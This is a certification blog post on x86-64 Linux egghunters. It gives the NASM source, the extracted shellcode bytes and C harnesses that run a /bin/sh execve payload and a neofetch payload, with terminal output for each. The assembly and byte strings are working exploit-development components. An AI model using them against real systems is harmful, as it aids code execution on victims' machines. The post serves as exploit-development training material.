---
title: SLAE64 - Assignment 3 - Egghunter
author: fwinsnes
date: 2021-01-24 13:44:00 +0800
categories: [SLAE64]
tags: [assembly, shellcoding]
---

#### Introduction

These series of posts starting with the prefix "SLAE64 - Assignment" will be created in order to fulfill the requirements of the SLAE64 certification. Today we are going to have a close look at Egghunters. 

An Egghunter is a form of malware, commonly used during Exploit-Development sessions in order to process bigger shellcode when there is low space available. The process is quite 
simple, this will search for a specific tag within the memory. When found, the flow will be passed upon the instructions following the tag, executing the original shellcode. 

The third assignment from the seven requires the creation of an Egghunter through the Assembly language, and converting such into [shellcode](https://es.wikipedia.org/wiki/Shellcode). Moreover, it is required to test such.

##### Methods

In order to create an Egghunter shellcode, there are several paths. However, as the time goes on, newer techniques are implemented that make shellcoding easier. I have chosen to 
cover a modern method which is fast, and tends to be very small regarding size. This method obeys the following procedure:

+ RCX is chosen as the register to compare with the tag.
+ The tag is saved on RBP. This tag will not be hardcoded.
+ RCX is incremented.
+ RBP is compared against RCX.
+ If the Zero flag (ZF) hasn't been set, repeat this loop.
+ Give RCX the value of RCX+8, in order to jump exactly within the shellcode and not the tag.
+ Jump to RCX.

Code:

```term
global _start

_start:

       inc rdx                     ; Increments RDX.
       push rdx                    ; Pushes the value of RDX into the Stack.
       pop rcx                     ; Pops the top of the Stack into RCX.

       mov rbp, 0x5756575657565756 ; Original tag should be 0x4645464546454645.
       mov rbx, 0x1111111111111111 ; Gives the value "0x1111111111111111" to RBX.
       sub rbp, rbx                ; RBP is substracted by RBX.

main:

       inc rcx                     ; RCX is incremented.
       cmp rbp, [rcx]              ; RBP is compared against RCX.
       jnz main                    ; Jump to main if the Zero flag (ZF) hasn't been set.

       lea rcx, [rcx + 8]          ; Copy RCX+8 into RCX.

       jmp rcx                     ; Jump into RCX.
```

Let's assemble this, link it, and get its shellcode.

```term
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_3$ nasm -f elf64 1.asm -o 1.o && ld 1.o -o 1 && for i in $(objdump -d 1 -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo 
\x48\xff\xc2\x52\x59\x48\xbd\x56\x57\x56\x57\x56\x57\x56\x57\x48\xbb\x11\x11\x11\x11\x11\x11\x11\x11\x48\x29\xdd\x48\xff\xc1\x48\x3b\x29\x75\xf8\x48\x8d\x49\x08\xff\xe1
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_3$
```

###### C format

```term
#include<stdio.h>
#include<string.h>

unsigned char egg[] = \
"\x48\xff\xc2\x52\x59\x48\xbd\x56\x57\x56\x57\x56\x57\x56\x57\x48\xbb\x11\x11\x11\x11\x11\x11\x11\x11\x48\x29\xdd\x48\xff\xc1\x48\x3b\x29\x75\xf8\x48\x8d\x49\x08\xff\xe1"

;

unsigned char code[] = \
"\x45\x46\x45\x46\x45\x46\x45\x46"
"\x48\x31\xc0\x48\x31\xf6\x48\x31\xdb\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

;

main()
{

  printf("Shellcode size:  %d\n", strlen(code));
  printf("Egg size:  %d\n", strlen(egg));

        int (*ret)() = (int(*)())egg;

        ret();

}
```

#### EndGame

```term
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_3$ gcc egghunter-x86_64.c -o egghunter-x86_64 -fno-stack-protector -z execstack -w 
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_3$ ./egghunter-x86_64 
Shellcode size:  44
Egg size:  42
$
```

As exactly as in the [x86 version of this post](https://whitecr0wz.github.io/posts/SLAE-Egghunter/), it was required that the egghunter had to be configurable for distinct payload. Due to the reason that the only thing required is the tag, this is rather easy, let's test it with an execve shellcode that executes neofetch.

###### C format #2

```term
#include<stdio.h>
#include<string.h>

unsigned char egg[] = \
"\x48\xff\xc2\x52\x59\x48\xbd\x56\x57\x56\x57\x56\x57\x56\x57\x48\xbb\x11\x11\x11\x11\x11\x11\x11\x11\x48\x29\xdd\x48\xff\xc1\x48\x3b\x29\x75\xf8\x48\x8d\x49\x08\xff\xe1"

;

unsigned char code[] = \
"\x45\x46\x45\x46\x45\x46\x45\x46"
"\x48\x31\xc0\x50\x48\xbb\x6e\x65\x6f\x66\x65\x74\x63\x68\x53\x48\xbb\x75\x73\x72\x2f\x62\x69\x6e\x2f\x53\x48\xbb\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

;

main()
{

  printf("Shellcode size:  %d\n", strlen(code));
  printf("Egg size:  %d\n", strlen(egg));

        int (*ret)() = (int(*)())egg;

        ret();

}
```

#### EndGame #2

```term
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_3/2$ gcc neofetch.c -o neofetch -fno-stack-protector -z execstack -w 
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_3/2$ ./neofetch 
Shellcode size:  60
Egg size:  42
       _,met$$$$$gg.          whitecr0wz@SLAE64
    ,g$$$$$$$$$$$$$$$P.       -----------------
  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 10 (buster) x86_64
 ,$$P'              `$$$.     Host: VirtualBox 1.2
',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-13-amd64
`d$$'     ,$P"'   .    $$$    Uptime: 8 mins
 $$P      d$'     ,    $$P    Packages: 475 (dpkg)
 $$:      $$.   -    ,d$$'    Shell: bash 5.0.3
 $$;      Y$b._   _,d$P'      CPU: Intel i5-8300H (1) @ 2.304GHz
 Y$$.    `.`"Y$$$$P"'         GPU: VMware SVGA II Adapter
 `$$b      "-.__              Memory: 66MiB / 987MiB
  `Y$$
   `Y$$.                                              
     `$$b.
       `Y$$b.
          `"Y$b._
              `"""

whitecr0wz@SLAE64:~/assembly/assignments/Assignment_3/2$
```

### Code

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE64-27812/PA-27812

You can find all of the used resources within this post [here](https://github.com/whitecr0wz/SLAE/tree/main/SLAE64/Assignment_3).
